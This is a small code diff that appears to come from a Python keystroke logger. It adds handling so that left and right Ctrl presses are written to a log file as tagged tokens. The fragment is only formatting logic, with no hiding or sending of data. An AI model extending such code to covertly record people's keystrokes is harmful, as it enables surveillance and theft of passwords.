@@ -34,7 +34,11 @@ def write_file(keys):
             elif k == "Key.shift_r":
                 f.write('<Rshift>')            
             elif k == "Key.shift":
-                f.write('<Lshift>')            
+                f.write('<Lshift>') 
+            elif k == "Key.ctrl_r":
+                f.write('<Rctrl>')            
+            elif k == "Key.ctrl_l":
+                f.write('<Lctrl>')      
             elif k == "Key.esc":
                 f.write('<esc>')
             else:
